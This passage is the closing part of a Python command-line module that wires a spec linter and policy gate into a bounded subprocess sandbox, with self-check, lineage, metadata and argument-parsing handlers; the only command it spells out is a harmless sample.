        "v1461_imports": ["SandboxSpec", "SandboxRunner", "SandboxMode", "SandboxResult"],
    }, indent=2, ensure_ascii=False))
    return 0


def _cmd_popper(args: argparse.Namespace) -> int:
    """Mini Popper check — falsifiability of the pipeline."""
    checks: Dict[str, bool] = {}
    # 1. All 8 outcomes declared
    checks["OUTCOMES_EXHAUSTIVE_8"] = len(PipelineOutcome) == 8
    # 2. All SandboxMode mapped to a PipelineOutcome
    checks["SANDBOXMODE_MAPPED"] = all(
        m in _V1461_TO_V1463 for m in SandboxMode
    )
    # 3. Adversarial suite has ≥ 30 specs
    checks["ADVERSARIAL_GE_30"] = len(_ADVERSARIAL_SPECS) >= 30
    # 4. Every adversarial spec has a declared expected outcome
    checks["ADVERSARIAL_HAS_EXPECTED"] = all(
        "expected" in e and isinstance(e["expected"], PipelineOutcome)
        for e in _ADVERSARIAL_SPECS
    )
    # 5. V1462 + V1461 imports callable
    try:
        from apeireth.v1462_asi_subprocess_sandbox_spec_security_linter import (
            lint_spec as _lint_spec,
            policy_gate as _policy_gate,
        )
        from apeireth.v1461_asi_docker_equivalent_subprocess_sandbox import SandboxRunner as _Runner
        checks["IMPORTS_CALLABLE"] = callable(_lint_spec) and callable(_policy_gate) and callable(_Runner)
    except Exception:
        checks["IMPORTS_CALLABLE"] = False
    # 6. PipelineReport serializable to JSON
    try:
        sample = run_pipeline(
            [SandboxSpec(command=[sys.executable, "-c", "print(1)"], timeout_s=5, max_output_bytes=1024)],
            labels=["sample"],
        )
        json.dumps(sample.to_dict())
        checks["REPORT_SERIALIZABLE"] = True
    except Exception:
        checks["REPORT_SERIALIZABLE"] = False
    # 7. mutate generator works
    try:
        mutated = generate_mutated_specs(n=10, seed=V1463_ADVERSARIAL_SEED)
        checks["MUTATOR_RUNNABLE"] = len(mutated) == 10
    except Exception:
        checks["MUTATOR_RUNNABLE"] = False

    bad = [k for k, v in checks.items() if not v]
    print(json.dumps({
        "n_checks": len(checks),
        "passed": len(checks) - len(bad),
        "failed": bad,
        "popper_pass": len(bad) == 0,
        "checks": checks,
    }, indent=2, ensure_ascii=False))
    return 0


def _cmd_chain(args: argparse.Namespace) -> int:
    chain = {
        "v1462": "lint_spec + policy_gate (SL060-SL099) — decides allow/block",
        "v1461": "SandboxSpec + SandboxRunner.run() — bounded subprocess sandbox",
        "v1460": "Anyone-Run Harness (13-stage) — subprocess orchestration pattern",
        "v1459": "5-axis hypercube (borrowed pattern: multi-axis synthesis)",
        "v1457": "6-deployment operational runbook (borrowed: lifecycle stages)",
        "v1429": "Real Deployment Semantic Linter (borrowed: linter lineage)",
        "v1432": "AnySearch probe (borrowed: probe pattern)",
        "stdlib": "argparse + json + dataclasses + enum + pathlib + random",
        "v1463_borrows_from": [
            "v1462", "v1461", "v1460", "v1459", "v1457", "v1429", "v1432", "stdlib",
        ],
        "all_ok": True,
    }
    print(json.dumps(chain, indent=2, ensure_ascii=False))
    return 0


def _cmd_meta(args: argparse.Namespace) -> int:
    meta = {
        "schema": V1463_SCHEMA,
        "version": V1463_VERSION,
        "module": V1463_MODULE,
        "phase": 1463,
        "post": ["v1462", "v1461", "v1460", "v1459"],
        "guards": [
            "GUARD_V1462_LINT_REUSED",
            "GUARD_V1461_RUNNER_REUSED",
            "GUARD_OUTCOMES_EXHAUSTIVE",
            "GUARD_JSONL_INPUT",
            "GUARD_REPORT_JSON_WRITTEN",
            "GUARD_REPORT_MD_WRITTEN",
            "GUARD_ADVERSARIAL_SUITE",
            "GUARD_BORROWED_LINEAGE",
            "GUARD_DETERMINISTIC",
            "GUARD_CLI_RUNNABLE",
        ],
        "v3_guards": [
            "GUARD_PIPELINE_NOT_ORCHESTRATOR",
            "GUARD_PIPELINE_NOT_CI",
            "GUARD_PIPELINE_NOT_ASI",
            "GUARD_PIPELINE_NOT_PHENOMENAL",
            "GUARD_PIPELINE_NOT_HUMAN_LEVEL",
        ],
        "n_adversarial_specs": len(_ADVERSARIAL_SPECS),
        "n_outcomes": len(PipelineOutcome),
    }
    print(json.dumps(meta, indent=2, ensure_ascii=False))
    return 0


def _cmd_help(args: argparse.Namespace) -> int:
    print(__doc__)
    return 0


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(
        prog=V1463_MODULE,
        description="V1463 — Lint-Gate Subprocess Pipeline (V1462 → V1461 end-to-end)",
    )
    sub = parser.add_subparsers(dest="cmd", required=False)

    p_run = sub.add_parser("run", help="Run pipeline on a JSONL of SandboxSpec dicts")
    p_run.add_argument("spec", help="path to JSONL file")
    p_run.add_argument("--policy", default="STANDARD", help="PERMISSIVE / STANDARD / STRICT")
    p_run.add_argument("--out", default=".", help="output directory for reports")
    p_run.set_defaults(func=_cmd_run)

    p_demo = sub.add_parser("demo", help="Run adversarial demo at a single declared policy")
    p_demo.add_argument("--policy", default="STANDARD", help="PERMISSIVE / STANDARD / STRICT")
    p_demo.add_argument("--out", default=".", help="output directory for reports")
    p_demo.set_defaults(func=_cmd_demo)

    p_adv = sub.add_parser("adversarial", help="Run full adversarial demo with mixed policies")
    p_adv.add_argument("--out", default=".", help="output directory for reports")
    p_adv.set_defaults(func=_cmd_adversarial)

    sub.add_parser("status", help="Print module status").set_defaults(func=_cmd_status)
    sub.add_parser("popper", help="Run mini Popper self-check").set_defaults(func=_cmd_popper)
    sub.add_parser("chain", help="Show borrowed-lineage chain").set_defaults(func=_cmd_chain)
    sub.add_parser("meta", help="Print module metadata").set_defaults(func=_cmd_meta)
    sub.add_parser("help", help="Print module help").set_defaults(func=_cmd_help)

    args = parser.parse_args(argv)
    if not getattr(args, "cmd", None):
        _cmd_help(args)
        return 0
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())